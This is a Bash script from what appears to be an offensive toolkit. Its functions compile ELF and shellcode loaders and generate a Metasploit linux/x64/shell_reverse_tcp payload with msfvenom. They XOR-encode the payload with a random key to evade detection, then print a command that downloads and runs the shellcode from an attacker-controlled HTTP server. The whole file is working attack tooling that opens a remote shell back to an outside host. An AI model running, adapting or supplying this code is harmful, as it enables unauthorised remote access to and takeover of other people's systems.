#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/linux_escalate.sh
source $SCRIPTDIR/general.sh
source $SCRIPTDIR/reverse_shells.sh
source $SCRIPTDIR/http_server.sh

compile_loader() {
    if [[ ! -d elf_loader ]]; then
        cp -rf $SCRIPTDIR/../c/elf_loader .
    fi
    pushd elf_loader > /dev/null || return 1
    exploit_file="main_64"
    if [[ ! -f $exploit_file ]]; then
        extra_packages=libcurl4-openssl-dev
        compile_cpp
    fi
    loader_file=loader
    popd > /dev/null || return 1
    generate_linux_download "elf_loader/$exploit_file" "$loader_file"
}


compile_shell_loader() {
    if [[ ! -d shell_loader ]]; then
        mkdir shell_loader
    fi
    pushd shell_loader > /dev/null || return 1
    cp -rf $SCRIPTDIR/../c/run_linux_shellcode.c .
    cp -rf $SCRIPTDIR/../c/curl_util.h .
    cp -rf $SCRIPTDIR/../c/curl_util.c .
    cp -rf $SCRIPTDIR/../c/encoding.c .
    exploit_file="main_64"
    if [[ -z $encoding_options ]]; then
        encoding_options="xor"
    fi
    if [[ ! -z $encoding_options ]]; then
        if [[ $encoding_options == "xor" ]]; then
            gcc_additional_flags="-DENCODING_XOR"
        fi
    fi
    if [[ -z $XOR_KEY ]]; then
        XOR_KEY=$(( RANDOM % 256 ))
    fi
    sed -i -E "s/\{KEY\}/$XOR_KEY/g" encoding.c
    sed -i -E "s/\{KEY\}/$XOR_KEY/g" run_linux_shellcode.c
    if [[ ! -f Makefile ]]; then
        echo "all: $exploit_file encode" > Makefile
        echo "$exploit_file:" >> Makefile
        echo -e "\tgcc run_linux_shellcode.c curl_util.c -o $exploit_file -lcurl -fPIC -pie $gcc_additional_flags" >> Makefile
        echo "encode:" >> Makefile
        echo -e "\t gcc encoding.c -o encode $gcc_additional_flags" >> Makefile  
    fi
    if [[ ! -f $exploit_file ]]; then
        extra_packages=libcurl4-openssl-dev
        compile_cpp
    fi
    loader_file=loader
    popd > /dev/null || return 1
    generate_linux_download "shell_loader/$exploit_file" "$loader_file"

}

get_shellcode_linux_reverse_shell() {
    prepare_generic_linux_shell
    prepare_http_server
    compile_shell_loader
    shellcode_file="shellcode.bin"
    if [[ -z $payload_type ]]; then
        payload_type="linux/x64/shell_reverse_tcp"
    fi    
    if [[ ! -z $payload_type ]]; then
        msfvenom -p $payload_type LHOST=$host_ip LPORT=$host_port > temp.bin
        shell_loader/encode temp.bin "$shellcode_file"
    fi 
    echo "./$loader_file http://$http_ip:$http_port/$shellcode_file"

}